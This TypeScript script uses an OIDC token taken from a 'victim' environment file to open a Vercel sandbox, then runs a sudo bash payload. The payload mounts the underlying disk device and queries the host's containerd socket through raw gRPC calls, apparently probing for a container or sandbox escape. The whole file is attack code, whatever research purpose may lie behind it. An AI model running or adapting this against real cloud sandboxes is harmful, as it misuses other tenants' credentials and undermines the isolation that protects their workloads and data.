import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
mkdir -p /mnt/vda2
mount -t xfs /dev/vda /mnt/vda2 2>/dev/null
R=/mnt/vda2
echo "===== containerd prior-knowledge verbose ====="
timeout 8 curl -v --http2-prior-knowledge --unix-socket $R/run/containerd/containerd.sock -X POST "http://unix/containerd.services.namespaces.v1.Namespaces/List" -H 'Content-Type: application/grpc' -H 'TE: trailers' --data-binary $'\\x00\\x00\\x00\\x00\\x00' 2>&1 | head -40
echo
echo "===== containerd prior-knowledge NO body ====="
timeout 8 curl -v --http2-prior-knowledge --unix-socket $R/run/containerd/containerd.sock "http://unix/containerd.services.namespaces.v1.Namespaces/List" -H 'Content-Type: application/grpc' -H 'TE: trailers' --data-binary '' 2>&1 | head -40
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore10.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore10.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 180_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });